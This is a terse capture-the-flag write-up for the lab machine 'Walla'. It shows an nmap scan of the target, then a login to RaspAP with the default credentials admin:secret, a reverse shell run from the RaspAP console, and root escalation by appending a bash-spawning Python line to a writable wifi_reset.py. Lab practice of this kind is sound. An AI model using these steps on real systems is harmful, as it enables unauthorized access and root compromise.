                                                                                                                                                                                            ┌──(kali㉿kali)-[~/oscp/pg-practice/walla]
└─$ nmap -sVC -p- -v -T4 -sT --open $ip            
Starting Nmap 7.95 ( https://nmap.org ) at 2026-07-28 04:52 EDT
NSE: Loaded 157 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 04:52
Completed NSE at 04:52, 0.00s elapsed
Initiating NSE at 04:52
Completed NSE at 04:52, 0.00s elapsed
Initiating NSE at 04:52
Completed NSE at 04:52, 0.00s elapsed
Initiating Ping Scan at 04:52
Scanning 192.168.136.97 [4 ports]
Completed Ping Scan at 04:52, 0.07s elapsed (1 total hosts)
Initiating Connect Scan at 04:52
Scanning walla (192.168.136.97) [65535 ports]
Discovered open port 23/tcp on 192.168.136.97
Discovered open port 22/tcp on 192.168.136.97
Discovered open port 25/tcp on 192.168.136.97
Discovered open port 53/tcp on 192.168.136.97
Discovered open port 8091/tcp on 192.168.136.97
Discovered open port 42042/tcp on 192.168.136.97
Discovered open port 422/tcp on 192.168.136.97
Completed Connect Scan at 04:52, 11.87s elapsed (65535 total ports)
Initiating Service scan at 04:52
Scanning 7 services on walla (192.168.136.97)
Completed Service scan at 04:52, 11.20s elapsed (7 services on 1 host)
NSE: Script scanning 192.168.136.97.
Initiating NSE at 04:52
Completed NSE at 04:52, 5.10s elapsed
Initiating NSE at 04:52
Completed NSE at 04:52, 1.72s elapsed
Initiating NSE at 04:52
Completed NSE at 04:52, 0.00s elapsed
Nmap scan report for walla (192.168.136.97)
Host is up (0.039s latency).
Not shown: 65528 closed tcp ports (conn-refused)
PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 02:71:5d:c8:b9:43:ba:6a:c8:ed:15:c5:6c:b2:f5:f9 (RSA)
|   256 f3:e5:10:d4:16:a9:9e:03:47:38:ba:ac:18:24:53:28 (ECDSA)
|_  256 02:4f:99:ec:85:6d:79:43:88:b2:b5:7c:f0:91:fe:74 (ED25519)
23/tcp    open  telnet     Linux telnetd
25/tcp    open  smtp       Postfix smtpd
| ssl-cert: Subject: commonName=walla
| Subject Alternative Name: DNS:walla
| Issuer: commonName=walla
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-09-17T18:26:36
| Not valid after:  2030-09-15T18:26:36
| MD5:   097c:bda1:76ab:9b73:c8ef:68ab:84e9:a055
|_SHA-1: 6c4b:fee3:0bd6:d910:2ef9:f81a:3a41:72d8:31bd:baac
|_ssl-date: TLS randomness does not represent time
|_smtp-commands: walla, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING
53/tcp    open  tcpwrapped
422/tcp   open  ssh        OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 02:71:5d:c8:b9:43:ba:6a:c8:ed:15:c5:6c:b2:f5:f9 (RSA)
|   256 f3:e5:10:d4:16:a9:9e:03:47:38:ba:ac:18:24:53:28 (ECDSA)
|_  256 02:4f:99:ec:85:6d:79:43:88:b2:b5:7c:f0:91:fe:74 (ED25519)
8091/tcp  open  http       lighttpd 1.4.53
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=RaspAP
|_http-server-header: lighttpd/1.4.53
|_http-favicon: Unknown favicon MD5: B5F9F8F2263315029AD7A81420E6CC2D
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
42042/tcp open  ssh        OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 02:71:5d:c8:b9:43:ba:6a:c8:ed:15:c5:6c:b2:f5:f9 (RSA)
|   256 f3:e5:10:d4:16:a9:9e:03:47:38:ba:ac:18:24:53:28 (ECDSA)
|_  256 02:4f:99:ec:85:6d:79:43:88:b2:b5:7c:f0:91:fe:74 (ED25519)
Service Info: Host:  walla; OS: Linux; CPE: cpe:/o:linux:linux_kernel


port 8091 uses RaspAP
web login
<img width="1325" height="405" alt="image" src="https://github.com/user-attachments/assets/bbc34808-69fb-473c-a0cf-bdeeeac1909c" />
default for raspAP is admin:secret
<img width="176" height="69" alt="image" src="https://github.com/user-attachments/assets/8b3613db-ff46-4869-8296-2cd8b307bf55" />
<img width="1912" height="800" alt="image" src="https://github.com/user-attachments/assets/ac3a8d10-a899-4ad5-83fe-a2cca3476d44" />

run reverse shell in the raspap console
<img width="1445" height="574" alt="image" src="https://github.com/user-attachments/assets/e7c11a28-fdf2-428d-b72a-c1df39a0915a" />

walter has the localtxt amd wifi_reset.py owned by root
<img width="559" height="158" alt="image" src="https://github.com/user-attachments/assets/a8269b9b-3331-427f-898a-67e024f62156" />

make a new wifi_reset.py
echo 'import os; os.system("/bin/bash")' >> /home/walter/wifi_reset.py
<img width="583" height="70" alt="image" src="https://github.com/user-attachments/assets/a9f89208-bc24-47f2-bc08-cdc286b903ed" />
<img width="725" height="73" alt="image" src="https://github.com/user-attachments/assets/676b6476-bb52-427e-93e5-33cdaabef4fa" />
